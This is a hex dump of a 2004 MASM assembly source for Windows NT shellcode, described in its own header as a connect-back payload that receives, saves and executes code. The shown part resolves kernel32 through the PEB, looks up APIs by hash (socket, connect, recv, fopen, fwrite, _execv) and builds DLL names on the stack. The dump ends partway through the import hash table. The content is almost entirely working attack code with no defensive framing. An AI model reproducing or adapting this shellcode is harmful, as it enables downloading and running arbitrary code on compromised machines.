00000000  3b 0d 0a 3b 20 6c 69 6e  6b 20 20 2d 20 20 63 6f  |;..; link  -  co|
00000010  6e 6e 65 63 74 62 61 63  6b 2c 20 72 65 63 65 69  |nnectback, recei|
00000020  76 65 2c 20 73 61 76 65  20 61 6e 64 20 65 78 65  |ve, save and exe|
00000030  63 75 74 65 20 73 68 65  6c 6c 63 6f 64 65 0d 0a  |cute shellcode..|
00000040  3b 0d 0a 3b 20 43 6f 70  79 72 69 67 68 74 20 28  |;..; Copyright (|
00000050  63 29 20 32 30 30 34 20  62 79 20 6c 6f 63 6f 0d  |c) 2004 by loco.|
00000060  0a 3b 20 41 6c 6c 20 52  69 67 68 74 73 20 52 65  |.; All Rights Re|
00000070  73 65 72 76 65 64 0d 0a  3b 0d 0a 3b 20 4e 4f 54  |served..;..; NOT|
00000080  45 3a 20 43 6f 6d 70 61  74 69 62 6c 65 20 77 69  |E: Compatible wi|
00000090  74 68 20 57 69 6e 64 6f  77 73 20 4e 54 20 62 61  |th Windows NT ba|
000000a0  73 65 64 20 6f 70 65 72  61 74 69 6e 67 20 73 79  |sed operating sy|
000000b0  73 74 65 6d 73 2e 20 49  50 76 34 20 6f 6e 6c 79  |stems. IPv4 only|
000000c0  2e 0d 0a 3b 0d 0a 3b 0d  0a 0d 0a 20 20 2e 33 38  |...;..;....  .38|
000000d0  36 0d 0a 20 20 2e 6d 6f  64 65 6c 20 66 6c 61 74  |6..  .model flat|
000000e0  2c 20 73 74 64 63 61 6c  6c 0d 0a 20 20 20 6f 70  |, stdcall..   op|
000000f0  74 69 6f 6e 20 63 61 73  65 6d 61 70 3a 6e 6f 6e  |tion casemap:non|
00000100  65 0d 0a 20 20 20 61 73  73 75 6d 65 20 66 73 3a  |e..   assume fs:|
00000110  66 6c 61 74 0d 0a 0d 0a  20 20 20 69 6e 63 6c 75  |flat....   inclu|
00000120  64 65 20 43 3a 5c 6d 61  73 6d 33 32 5c 69 6e 63  |de C:\masm32\inc|
00000130  6c 75 64 65 5c 77 69 6e  64 6f 77 73 2e 69 6e 63  |lude\windows.inc|
00000140  20 20 20 3b 20 73 74 61  6e 64 61 72 64 20 77 69  |   ; standard wi|
00000150  6e 64 6f 77 73 20 68 65  61 64 65 72 0d 0a 20 20  |ndows header..  |
00000160  20 69 6e 63 6c 75 64 65  20 43 3a 5c 6d 61 73 6d  | include C:\masm|
00000170  33 32 5c 69 6e 63 6c 75  64 65 5c 6b 65 72 6e 65  |32\include\kerne|
00000180  6c 33 32 2e 69 6e 63 20  20 3b 20 64 65 66 69 6e  |l32.inc  ; defin|
00000190  69 74 69 6f 6e 73 20 6f  66 20 6b 65 72 6e 65 6c  |itions of kernel|
000001a0  33 32 2e 64 6c 6c 0d 0a  0d 0a 20 20 20 69 6e 63  |32.dll....   inc|
000001b0  6c 75 64 65 6c 69 62 20  43 3a 5c 6d 61 73 6d 33  |ludelib C:\masm3|
000001c0  32 5c 6c 69 62 5c 6b 65  72 6e 65 6c 33 32 2e 6c  |2\lib\kernel32.l|
000001d0  69 62 20 20 20 3b 20 77  65 20 6d 75 73 74 20 68  |ib   ; we must h|
000001e0  61 76 65 20 6b 65 72 6e  65 6c 33 32 2e 64 6c 6c  |ave kernel32.dll|
000001f0  20 69 6e 20 6f 75 72 20  70 72 6f 63 65 73 73 20  | in our process |
00000200  69 66 20 77 65 20 77 61  6e 74 20 74 6f 20 74 65  |if we want to te|
00000210  73 74 20 69 74 0d 0a 0d  0a 20 20 2e 64 61 74 61  |st it....  .data|
00000220  0d 0a 0d 0a 20 20 20 64  64 20 47 65 74 54 69 63  |....   dd GetTic|
00000230  6b 43 6f 75 6e 74 20 3b  20 72 65 66 65 72 20 74  |kCount ; refer t|
00000240  6f 20 47 65 74 54 69 63  6b 43 6f 75 6e 74 20 73  |o GetTickCount s|
00000250  6f 20 74 68 61 74 20 6b  65 72 6e 65 6c 33 32 2e  |o that kernel32.|
00000260  64 6c 6c 20 67 65 74 73  20 6c 6f 61 64 65 64 20  |dll gets loaded |
00000270  69 6e 74 6f 20 6f 75 72  20 70 72 6f 63 65 73 73  |into our process|
00000280  0d 0a 0d 0a 20 20 2e 63  6f 64 65 0d 0a 0d 0a 20  |....  .code.... |
00000290  20 20 64 62 20 27 53 54  41 52 54 2d 3e 27 20 20  |  db 'START->'  |
000002a0  20 20 3b 20 73 74 61 72  74 20 6f 66 20 73 68 65  |  ; start of she|
000002b0  6c 6c 63 6f 64 65 20 28  6d 61 6b 65 73 20 63 6f  |llcode (makes co|
000002c0  70 79 20 6e 20 70 61 73  74 69 6e 67 20 65 61 73  |py n pasting eas|
000002d0  69 65 72 20 6c 61 74 65  72 29 0d 0a 0d 0a 3b 20  |ier later)....; |
000002e0  2a 2a 2a 20 73 74 75 66  66 20 74 68 61 74 20 6d  |*** stuff that m|
000002f0  61 6b 65 73 20 6f 75 72  20 6c 69 66 65 20 65 61  |akes our life ea|
00000300  73 69 65 72 20 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |sier ***********|
00000310  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
00000320  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 0d 0a  |**************..|
00000330  0d 0a 20 20 20 3b 20 6b  65 72 6e 65 6c 33 32 2e  |..   ; kernel32.|
00000340  64 6c 6c 0d 0a 20 20 20  5f 5f 69 6d 70 5f 45 78  |dll..   __imp_Ex|
00000350  69 74 54 68 72 65 61 64  20 20 65 71 75 20 64 77  |itThread  equ dw|
00000360  6f 72 64 20 70 74 72 20  5b 65 62 70 20 2b 20 30  |ord ptr [ebp + 0|
00000370  34 68 5d 0d 0a 20 20 20  5f 5f 69 6d 70 5f 4c 6f  |4h]..   __imp_Lo|
00000380  61 64 4c 69 62 72 61 72  79 20 65 71 75 20 64 77  |adLibrary equ dw|
00000390  6f 72 64 20 70 74 72 20  5b 65 62 70 20 2b 20 30  |ord ptr [ebp + 0|
000003a0  38 68 5d 0d 0a 20 20 20  3b 20 6d 73 76 63 72 74  |8h]..   ; msvcrt|
000003b0  2e 64 6c 6c 0d 0a 20 20  20 5f 5f 69 6d 70 5f 66  |.dll..   __imp_f|
000003c0  6f 70 65 6e 20 20 20 20  20 20 20 65 71 75 20 64  |open       equ d|
000003d0  77 6f 72 64 20 70 74 72  20 5b 65 62 70 20 2b 20  |word ptr [ebp + |
000003e0  30 63 68 5d 0d 0a 20 20  20 5f 5f 69 6d 70 5f 66  |0ch]..   __imp_f|
000003f0  77 72 69 74 65 20 20 20  20 20 20 65 71 75 20 64  |write      equ d|
00000400  77 6f 72 64 20 70 74 72  20 5b 65 62 70 20 2b 20  |word ptr [ebp + |
00000410  31 30 68 5d 0d 0a 20 20  20 5f 5f 69 6d 70 5f 66  |10h]..   __imp_f|
00000420  63 6c 6f 73 65 20 20 20  20 20 20 65 71 75 20 64  |close      equ d|
00000430  77 6f 72 64 20 70 74 72  20 5b 65 62 70 20 2b 20  |word ptr [ebp + |
00000440  31 34 68 5d 0d 0a 20 20  20 5f 5f 69 6d 70 5f 5f  |14h]..   __imp__|
00000450  65 78 65 63 76 20 20 20  20 20 20 65 71 75 20 64  |execv      equ d|
00000460  77 6f 72 64 20 70 74 72  20 5b 65 62 70 20 2b 20  |word ptr [ebp + |
00000470  31 38 68 5d 0d 0a 20 20  20 3b 20 77 73 32 5f 33  |18h]..   ; ws2_3|
00000480  32 2e 64 6c 6c 0d 0a 20  20 20 5f 5f 69 6d 70 5f  |2.dll..   __imp_|
00000490  57 53 41 53 74 61 72 74  75 70 20 20 65 71 75 20  |WSAStartup  equ |
000004a0  64 77 6f 72 64 20 70 74  72 20 5b 65 62 70 20 2b  |dword ptr [ebp +|
000004b0  20 31 63 68 5d 0d 0a 20  20 20 5f 5f 69 6d 70 5f  | 1ch]..   __imp_|
000004c0  73 6f 63 6b 65 74 20 20  20 20 20 20 65 71 75 20  |socket      equ |
000004d0  64 77 6f 72 64 20 70 74  72 20 5b 65 62 70 20 2b  |dword ptr [ebp +|
000004e0  20 32 30 68 5d 0d 0a 20  20 20 5f 5f 69 6d 70 5f  | 20h]..   __imp_|
000004f0  63 6f 6e 6e 65 63 74 20  20 20 20 20 65 71 75 20  |connect     equ |
00000500  64 77 6f 72 64 20 70 74  72 20 5b 65 62 70 20 2b  |dword ptr [ebp +|
00000510  20 32 34 68 5d 0d 0a 20  20 20 5f 5f 69 6d 70 5f  | 24h]..   __imp_|
00000520  72 65 63 76 20 20 20 20  20 20 20 20 65 71 75 20  |recv        equ |
00000530  64 77 6f 72 64 20 70 74  72 20 5b 65 62 70 20 2b  |dword ptr [ebp +|
00000540  20 32 38 68 5d 0d 0a 20  20 20 5f 5f 69 6d 70 5f  | 28h]..   __imp_|
00000550  73 65 6e 64 20 20 20 20  20 20 20 20 65 71 75 20  |send        equ |
00000560  64 77 6f 72 64 20 70 74  72 20 5b 65 62 70 20 2b  |dword ptr [ebp +|
00000570  20 32 63 68 5d 0d 0a 20  20 20 5f 5f 69 6d 70 5f  | 2ch]..   __imp_|
00000580  63 6c 6f 73 65 73 6f 63  6b 65 74 20 65 71 75 20  |closesocket equ |
00000590  64 77 6f 72 64 20 70 74  72 20 5b 65 62 70 20 2b  |dword ptr [ebp +|
000005a0  20 33 30 68 5d 0d 0a 0d  0a 3b 20 2a 2a 2a 20 47  | 30h]....; *** G|
000005b0  65 74 49 6d 70 6f 72 74  41 64 64 72 65 73 73 20  |etImportAddress |
000005c0  6d 61 63 72 6f 20 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |macro **********|
000005d0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000005f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 0d 0a 0d 0a 47 65 74  |*********....Get|
00000600  49 6d 70 6f 72 74 41 64  64 72 65 73 73 20 4d 41  |ImportAddress MA|
00000610  43 52 4f 0d 0a 20 20 20  4c 4f 43 41 4c 20 47 65  |CRO..   LOCAL Ge|
00000620  74 49 6d 70 6f 72 74 41  64 64 72 65 73 73 4c 6f  |tImportAddressLo|
00000630  6f 70 0d 0a 20 20 20 4c  4f 43 41 4c 20 47 65 74  |op..   LOCAL Get|
00000640  49 6d 70 6f 72 74 48 61  73 68 4c 6f 6f 70 0d 0a  |ImportHashLoop..|
00000650  0d 0a 20 20 20 6d 6f 76  20 20 20 65 64 78 2c 20  |..   mov   edx, |
00000660  64 77 6f 72 64 20 70 74  72 20 5b 65 64 69 20 2b  |dword ptr [edi +|
00000670  20 33 63 68 5d 20 20 20  20 20 20 20 3b 20 67 65  | 3ch]       ; ge|
00000680  74 20 6f 66 66 73 65 74  20 6f 66 20 50 45 20 68  |t offset of PE h|
00000690  65 61 64 65 72 0d 0a 20  20 20 6d 6f 76 20 20 20  |eader..   mov   |
000006a0  65 64 78 2c 20 64 77 6f  72 64 20 70 74 72 20 5b  |edx, dword ptr [|
000006b0  65 64 69 20 2b 20 65 64  78 20 2b 20 37 38 68 5d  |edi + edx + 78h]|
000006c0  20 3b 20 67 65 74 20 52  56 41 20 6f 66 20 65 78  | ; get RVA of ex|
000006d0  70 6f 72 74 20 64 69 72  65 63 74 6f 72 79 0d 0a  |port directory..|
000006e0  20 20 20 61 64 64 20 20  20 65 64 78 2c 20 65 64  |   add   edx, ed|
000006f0  69 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |i               |
00000700  20 20 20 20 20 20 20 20  20 20 3b 20 63 6f 6e 76  |          ; conv|
00000710  65 72 74 20 69 74 20 74  6f 20 70 6f 69 6e 74 65  |ert it to pointe|
00000720  72 0d 0a 20 20 20 70 75  73 68 20 20 65 64 78 20  |r..   push  edx |
00000730  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000740  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |             ; s|
00000750  61 76 65 20 69 74 20 74  6f 20 73 74 61 63 6b 0d  |ave it to stack.|
00000760  0a 0d 0a 20 20 20 6d 6f  76 20 20 20 65 64 78 2c  |...   mov   edx,|
00000770  20 5b 65 64 78 20 2b 20  32 30 68 5d 20 20 20 20  | [edx + 20h]    |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 67  |             ; g|
00000790  65 74 20 72 76 61 20 6f  66 20 72 76 61 27 73 20  |et rva of rva's |
000007a0  6f 66 20 6e 61 6d 65 73  0d 0a 20 20 20 61 64 64  |of names..   add|
000007b0  20 20 20 65 64 78 2c 20  65 64 69 20 20 20 20 20  |   edx, edi     |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007d0  20 20 20 20 3b 20 63 6f  6e 76 65 72 74 20 69 74  |    ; convert it|
000007e0  20 74 6f 20 70 6f 69 6e  74 65 72 0d 0a 0d 0a 20  | to pointer.... |
000007f0  20 20 78 6f 72 20 20 20  65 62 78 2c 20 65 62 78  |  xor   ebx, ebx|
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000810  20 20 20 20 20 20 20 20  20 3b 20 69 6e 64 65 78  |         ; index|
00000820  20 6f 66 20 6f 72 64 69  6e 61 6c 20 77 69 6c 6c  | of ordinal will|
00000830  20 62 65 20 73 61 76 65  64 20 69 6e 20 65 62 78  | be saved in ebx|
00000840  0d 0a 47 65 74 49 6d 70  6f 72 74 41 64 64 72 65  |..GetImportAddre|
00000850  73 73 4c 6f 6f 70 3a 0d  0a 20 20 20 69 6e 63 20  |ssLoop:..   inc |
00000860  20 20 65 62 78 20 20 20  20 20 20 20 20 20 20 20  |  ebx           |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000880  20 20 20 3b 20 6a 75 73  74 20 73 6b 69 70 20 74  |   ; just skip t|
00000890  68 65 20 66 69 72 73 74  20 65 6e 74 72 79 0d 0a  |he first entry..|
000008a0  20 20 20 6d 6f 76 20 20  20 65 73 69 2c 20 5b 65  |   mov   esi, [e|
000008b0  64 78 20 2b 20 65 62 78  20 2a 20 30 34 68 5d 20  |dx + ebx * 04h] |
000008c0  20 20 20 20 20 20 20 20  20 20 3b 20 67 65 74 20  |          ; get |
000008d0  72 76 61 20 6f 66 20 6e  61 6d 65 0d 0a 20 20 20  |rva of name..   |
000008e0  61 64 64 20 20 20 65 73  69 2c 20 65 64 69 20 20  |add   esi, edi  |
000008f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000900  20 20 20 20 20 20 20 3b  20 63 6f 6e 76 65 72 74  |       ; convert|
00000910  20 69 74 20 74 6f 20 70  6f 69 6e 74 65 72 0d 0a  | it to pointer..|
00000920  20 20 20 78 6f 72 20 20  20 65 63 78 2c 20 65 63  |   xor   ecx, ec|
00000930  78 0d 0a 20 20 20 6c 6f  64 73 62 20 20 20 20 20  |x..   lodsb     |
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 6d  |             ; m|
00000960  6f 76 20 61 6c 2c 20 62  79 74 65 20 70 74 72 20  |ov al, byte ptr |
00000970  5b 65 73 69 5d 20 2d 3e  20 69 6e 63 20 65 73 69  |[esi] -> inc esi|
00000980  0d 0a 47 65 74 49 6d 70  6f 72 74 48 61 73 68 4c  |..GetImportHashL|
00000990  6f 6f 70 3a 0d 0a 20 20  20 78 6f 72 20 20 20 63  |oop:..   xor   c|
000009a0  6c 2c 20 61 6c 0d 0a 20  20 20 72 6f 6c 20 20 20  |l, al..   rol   |
000009b0  65 63 78 2c 20 35 0d 0a  20 20 20 6c 6f 64 73 62  |ecx, 5..   lodsb|
000009c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000009e0  20 20 3b 20 6d 6f 76 20  61 6c 2c 20 62 79 74 65  |  ; mov al, byte|
000009f0  20 70 74 72 20 5b 65 73  69 5d 20 2d 3e 20 69 6e  | ptr [esi] -> in|
00000a00  63 20 65 73 69 0d 0a 20  20 20 74 65 73 74 20 20  |c esi..   test  |
00000a10  61 6c 2c 20 61 6c 0d 0a  20 20 20 6a 6e 7a 20 20  |al, al..   jnz  |
00000a20  20 47 65 74 49 6d 70 6f  72 74 48 61 73 68 4c 6f  | GetImportHashLo|
00000a30  6f 70 0d 0a 0d 0a 20 20  20 6d 6f 76 20 20 20 65  |op....   mov   e|
00000a40  73 69 2c 20 5b 65 62 70  5d 20 20 20 20 20 20 20  |si, [ebp]       |
00000a50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a60  3b 20 67 65 74 20 69 6e  64 65 78 20 6f 66 20 63  |; get index of c|
00000a70  75 72 72 65 6e 74 20 66  75 6e 63 74 69 6f 6e 0d  |urrent function.|
00000a80  0a 20 20 20 73 75 62 20  20 20 65 63 78 2c 20 5b  |.   sub   ecx, [|
00000a90  65 62 70 20 2b 20 65 73  69 20 2a 20 30 34 68 5d  |ebp + esi * 04h]|
00000aa0  20 20 20 20 20 20 20 20  20 20 20 3b 20 73 75 62  |           ; sub|
00000ab0  20 74 68 65 20 6f 72 69  67 69 6e 61 6c 20 68 61  | the original ha|
00000ac0  73 68 20 66 72 6f 6d 20  63 75 72 72 65 6e 74 0d  |sh from current.|
00000ad0  0a 20 20 20 6a 6e 7a 20  20 20 47 65 74 49 6d 70  |.   jnz   GetImp|
00000ae0  6f 72 74 41 64 64 72 65  73 73 4c 6f 6f 70 20 20  |ortAddressLoop  |
00000af0  20 20 20 20 20 20 20 20  20 20 20 3b 20 6e 6f 74  |           ; not|
00000b00  20 65 71 75 61 6c 3f 20  74 72 79 20 6e 65 78 74  | equal? try next|
00000b10  0d 0a 0d 0a 20 20 20 78  63 68 67 20 20 65 73 69  |....   xchg  esi|
00000b20  2c 20 5b 65 73 70 5d 20  20 20 20 20 20 20 20 20  |, [esp]         |
00000b30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000b40  70 6f 69 6e 74 65 72 20  74 6f 20 65 78 70 6f 72  |pointer to expor|
00000b50  74 20 74 61 62 6c 65 20  69 6e 20 65 73 69 20 6e  |t table in esi n|
00000b60  6f 77 0d 0a 20 20 20 6d  6f 76 20 20 20 65 64 78  |ow..   mov   edx|
00000b70  2c 20 5b 65 73 69 20 2b  20 32 34 68 5d 20 20 20  |, [esi + 24h]   |
00000b80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000b90  67 65 74 20 72 76 61 20  6f 66 20 61 72 72 61 79  |get rva of array|
00000ba0  20 6f 66 20 6f 72 64 69  6e 61 6c 73 0d 0a 20 20  | of ordinals..  |
00000bb0  20 61 64 64 20 20 20 65  64 78 2c 20 65 64 69 20  | add   edx, edi |
00000bc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bd0  20 20 20 20 20 20 20 20  3b 20 63 6f 6e 76 65 72  |        ; conver|
00000be0  74 20 69 74 20 74 6f 20  70 6f 69 6e 74 65 72 0d  |t it to pointer.|
00000bf0  0a 20 20 20 6d 6f 76 20  20 20 63 78 2c 20 5b 65  |.   mov   cx, [e|
00000c00  64 78 20 2b 20 65 62 78  20 2a 20 32 5d 20 20 20  |dx + ebx * 2]   |
00000c10  20 20 20 20 20 20 20 20  20 20 20 3b 20 67 65 74  |           ; get|
00000c20  20 6f 72 64 69 6e 61 6c  0d 0a 0d 0a 20 20 20 6d  | ordinal....   m|
00000c30  6f 76 20 20 20 65 64 78  2c 20 5b 65 73 69 20 2b  |ov   edx, [esi +|
00000c40  20 31 63 68 5d 20 20 20  20 20 20 20 20 20 20 20  | 1ch]           |
00000c50  20 20 20 20 20 20 3b 20  67 65 74 20 72 76 61 20  |      ; get rva |
00000c60  6f 66 20 61 72 72 61 79  20 6f 66 20 70 6f 69 6e  |of array of poin|
00000c70  74 65 72 73 20 74 6f 20  66 75 6e 63 74 69 6f 6e  |ters to function|
00000c80  73 0d 0a 20 20 20 61 64  64 20 20 20 65 64 78 2c  |s..   add   edx,|
00000c90  20 65 64 69 20 20 20 20  20 20 20 20 20 20 20 20  | edi            |
00000ca0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 63  |             ; c|
00000cb0  6f 6e 76 65 72 74 20 69  74 20 74 6f 20 70 6f 69  |onvert it to poi|
00000cc0  6e 74 65 72 0d 0a 0d 0a  20 20 20 6d 6f 76 20 20  |nter....   mov  |
00000cd0  20 65 61 78 2c 20 5b 65  64 78 20 2b 20 65 63 78  | eax, [edx + ecx|
00000ce0  20 2a 20 34 5d 20 20 20  20 20 20 20 20 20 20 20  | * 4]           |
00000cf0  20 20 3b 20 67 65 74 20  72 76 61 20 6f 66 20 66  |  ; get rva of f|
00000d00  75 6e 63 74 69 6f 6e 0d  0a 20 20 20 61 64 64 20  |unction..   add |
00000d10  20 20 65 61 78 2c 20 65  64 69 20 20 20 20 20 20  |  eax, edi      |
00000d20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d30  20 20 20 3b 20 63 6f 6e  76 65 72 74 20 69 74 20  |   ; convert it |
00000d40  74 6f 20 70 6f 69 6e 74  65 72 0d 0a 20 20 20 70  |to pointer..   p|
00000d50  6f 70 20 20 20 65 73 69  20 20 20 20 20 20 20 20  |op   esi        |
00000d60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d70  20 20 20 20 20 20 3b 20  69 6e 64 65 78 20 6f 66  |      ; index of|
00000d80  20 63 75 72 72 65 6e 74  20 66 75 6e 63 74 69 6f  | current functio|
00000d90  6e 20 69 6e 20 65 73 69  0d 0a 20 20 20 6d 6f 76  |n in esi..   mov|
00000da0  20 20 20 5b 65 62 70 20  2b 20 65 73 69 20 2a 20  |   [ebp + esi * |
00000db0  30 34 68 5d 2c 20 65 61  78 20 20 20 20 20 20 20  |04h], eax       |
00000dc0  20 20 20 20 3b 20 6d 6f  76 65 20 70 6f 69 6e 74  |    ; move point|
00000dd0  65 72 20 74 6f 20 63 6f  72 72 65 63 74 20 65 6e  |er to correct en|
00000de0  74 72 79 0d 0a 20 20 20  69 6e 63 20 20 20 64 77  |try..   inc   dw|
00000df0  6f 72 64 20 70 74 72 20  5b 65 62 70 5d 20 20 20  |ord ptr [ebp]   |
00000e00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000e10  20 69 6e 63 72 65 6d 65  6e 74 20 69 6e 64 65 78  | increment index|
00000e20  20 6f 66 20 63 75 72 72  65 6e 74 20 66 75 6e 63  | of current func|
00000e30  74 69 6f 6e 0d 0a 45 4e  44 4d 0d 0a 0d 0a 73 74  |tion..ENDM....st|
00000e40  61 72 74 3a 0d 0a 3b 20  2a 2a 2a 20 66 69 6e 64  |art:..; *** find|
00000e50  20 6b 65 72 6e 65 6c 33  32 2e 64 6c 6c 20 62 61  | kernel32.dll ba|
00000e60  73 65 20 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |se *************|
00000e70  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000e90  2a 2a 2a 2a 2a 2a 0d 0a  0d 0a 20 20 20 78 6f 72  |******....   xor|
00000ea0  20 20 20 65 62 78 2c 20  65 62 78 0d 0a 20 20 20  |   ebx, ebx..   |
00000eb0  6d 6f 76 20 20 20 65 61  78 2c 20 66 73 3a 5b 65  |mov   eax, fs:[e|
00000ec0  62 78 20 2b 20 33 30 68  5d 20 20 20 20 3b 20 45  |bx + 30h]    ; E|
00000ed0  78 74 72 61 63 74 20 74  68 65 20 50 45 42 0d 0a  |xtract the PEB..|
00000ee0  20 20 20 6d 6f 76 20 20  20 65 61 78 2c 20 5b 65  |   mov   eax, [e|
00000ef0  61 78 20 2b 20 30 63 68  5d 20 20 20 20 20 20 20  |ax + 0ch]       |
00000f00  3b 20 45 78 74 72 61 63  74 20 74 68 65 20 50 52  |; Extract the PR|
00000f10  4f 43 45 53 53 5f 4d 4f  44 55 4c 45 5f 49 4e 46  |OCESS_MODULE_INF|
00000f20  4f 20 70 6f 69 6e 74 65  72 20 66 72 6f 6d 20 74  |O pointer from t|
00000f30  68 65 20 50 45 42 0d 0a  20 20 20 6d 6f 76 20 20  |he PEB..   mov  |
00000f40  20 65 73 69 2c 20 5b 65  61 78 20 2b 20 31 63 68  | esi, [eax + 1ch|
00000f50  5d 20 20 20 20 20 20 20  3b 20 47 65 74 20 74 68  |]       ; Get th|
00000f60  65 20 61 64 64 72 65 73  73 20 6f 66 20 66 6c 69  |e address of fli|
00000f70  6e 6b 20 69 6e 20 74 68  65 20 69 6e 69 74 20 6d  |nk in the init m|
00000f80  6f 64 75 6c 65 20 6c 69  73 74 0d 0a 20 20 20 6c  |odule list..   l|
00000f90  6f 64 73 64 20 20 20 20  20 20 20 20 20 20 20 20  |odsd            |
00000fa0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 4c 6f  |            ; Lo|
00000fb0  61 64 20 74 68 65 20 61  64 64 72 65 73 73 20 6f  |ad the address o|
00000fc0  66 20 62 6c 69 6e 6b 20  69 6e 74 6f 20 65 61 78  |f blink into eax|
00000fd0  0d 0a 20 20 20 6d 6f 76  20 20 20 65 61 78 2c 20  |..   mov   eax, |
00000fe0  5b 65 61 78 20 2b 20 30  38 68 5d 20 20 20 20 20  |[eax + 08h]     |
00000ff0  20 20 3b 20 47 72 61 62  20 74 68 65 20 6d 6f 64  |  ; Grab the mod|
00001000  75 6c 65 20 62 61 73 65  20 61 64 64 72 65 73 73  |ule base address|
00001010  20 66 72 6f 6d 20 74 68  65 20 6c 69 73 74 20 65  | from the list e|
00001020  6e 74 72 79 0d 0a 0d 0a  3b 20 2a 2a 2a 20 6c 6f  |ntry....; *** lo|
00001030  61 64 20 74 68 65 20 69  6d 70 6f 72 74 73 20 2a  |ad the imports *|
00001040  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00001070  2a 2a 2a 2a 2a 2a 2a 2a  0d 0a 0d 0a 20 20 20 70  |********....   p|
00001080  75 73 68 20 20 65 62 78  20 20 20 20 20 20 20 20  |ush  ebx        |
00001090  20 3b 20 30 0d 0a 20 20  20 70 75 73 68 20 20 65  | ; 0..   push  e|
000010a0  62 78 20 20 20 20 20 20  20 20 20 3b 20 30 0d 0a  |bx         ; 0..|
000010b0  20 20 20 70 75 73 68 20  20 27 32 33 27 20 20 20  |   push  '23'   |
000010c0  20 20 20 20 20 3b 20 3f  3f 3f 3f 33 32 20 66 69  |     ; ????32 fi|
000010d0  72 73 74 20 70 61 72 74  20 6f 66 20 77 73 32 5f  |rst part of ws2_|
000010e0  33 32 0d 0a 20 20 20 70  75 73 68 20 20 27 5f 32  |32..   push  '_2|
000010f0  73 77 27 20 20 20 20 20  20 3b 20 77 73 32 5f 3f  |sw'      ; ws2_?|
00001100  3f 20 73 65 63 6f 6e 64  20 70 61 72 74 20 6f 66  |? second part of|
00001110  20 77 73 32 5f 33 32 0d  0a 20 20 20 70 75 73 68  | ws2_32..   push|
00001120  20 20 27 74 72 27 20 20  20 20 20 20 20 20 3b 20  |  'tr'        ; |
00001130  3f 3f 3f 3f 72 74 20 66  69 72 73 74 20 70 61 72  |????rt first par|
00001140  74 20 6f 66 20 6d 73 76  63 72 74 0d 0a 20 20 20  |t of msvcrt..   |
00001150  70 75 73 68 20 20 27 63  76 73 6d 27 20 20 20 20  |push  'cvsm'    |
00001160  20 20 3b 20 6d 73 76 63  3f 3f 20 73 65 63 6f 6e  |  ; msvc?? secon|
00001170  64 20 70 61 72 74 20 6f  66 20 6d 73 76 63 72 74  |d part of msvcrt|
00001180  0d 0a 20 20 20 63 61 6c  6c 20 20 4f 76 65 72 49  |..   call  OverI|
00001190  6d 70 6f 72 74 48 61 73  68 65 73 0d 0a 20 20 20  |mportHashes..   |
000011a0  64 64 20 31 0d 0a 20 20  20 3b 20 6b 65 72 6e 65  |dd 1..   ; kerne|
000011b0  6c 33 32 2e 64 6c 6c 0d  0a 20 20 20 64 64 20 30  |l32.dll..   dd 0|
000011c0  44 36 30 38 36 32 33 35  68 20 3b 20 45 78 69 74  |D6086235h ; Exit|
000011d0  54 68 72 65 61 64 0d 0a  20 20 20 64 64 20 30 39  |Thread..   dd 09|
000011e0  34 32 30 32 33 37 34 68  20 3b 20 4c 6f 61 64 4c  |4202374h ; LoadL|
000011f0  69 62 72 61 72 79 0d 0a  20 20 20 3b 20 6d 73 76  |ibrary..   ; msv|
00001200  63 72 74 0d 0a 20 20 20  64 64 20 30 43 41 43 39  |crt..   dd 0CAC9|
00001210  39 39 43 30 68 20 3b 20  66 6f 70 65 6e 0d 0a 20  |99C0h ; fopen.. |
00001220  20 20 64 64 20 30 36 39  31 35 35 43 42 39 68 20  |  dd 069155CB9h |
00001230  3b 20 66 77 72 69 74 65  0d 0a 20 20 20 64 64 20  |; fwrite..   dd |
00001240  30 34 30 46 36 34 30 42  39 68 20 3b 20 66 63 6c  |040F640B9h ; fcl|
00001250  6f 73 65 0d 0a 20 20 20  64 64 20 30 30 44 42 33  |ose..   dd 00DB3|
00001260  30 32 44 37 68 20 3b 20  5f 65 78 65 63 76 0d 0a  |02D7h ; _execv..|
00001270  20 20 20 3b 20 77 73 32  5f 33 32 2e 64 6c 6c 0d  |   ; ws2_32.dll.|
00001280  0a 20 20 20 64 64 20 30  43 34 34 44 46 39 38 35  |.   dd 0C44DF985|
00001290  68 20 3b 20 57 53 41 53  74 61 72 74 75 70 0d 0a  |h ; WSAStartup..|
000012a0  20 20 20 64 64 20 30 31  38 30 34 31 41 39 43 68  |   dd 018041A9Ch|
